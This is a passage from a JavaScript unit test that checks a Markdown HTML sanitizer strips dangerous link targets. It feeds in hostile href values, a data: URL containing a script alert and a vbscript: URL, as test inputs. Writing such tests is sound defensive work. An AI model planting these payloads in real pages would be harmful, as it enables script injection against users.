    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
  ]) {
    assert.doesNotMatch(
      sanitizeMarkdownHtml(`<a href="${href}">x</a>`),
      /href=/,
      `hostile href survived: ${href}`,
    );
  }
});
